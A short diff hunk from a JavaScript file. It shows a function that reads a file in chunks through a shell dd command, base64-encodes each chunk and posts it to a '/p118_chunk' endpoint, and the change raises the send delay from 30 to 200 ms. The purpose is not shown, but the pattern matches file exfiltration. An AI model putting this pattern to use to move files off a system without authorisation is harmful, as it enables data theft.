@@ -43,7 +43,7 @@ function sendChunk() {
     var b64 = sh("dd if=" + FILE + " bs=" + CHUNK + " skip=" + idx + " count=1 2>/dev/null | base64 -w 0", 500000);
     post("/p118_chunk", { i: idx, d: trim(b64) });
     idx++;
-    setTimeout(sendChunk, 30);
+    setTimeout(sendChunk, 200);
 }
 
 sendChunk();
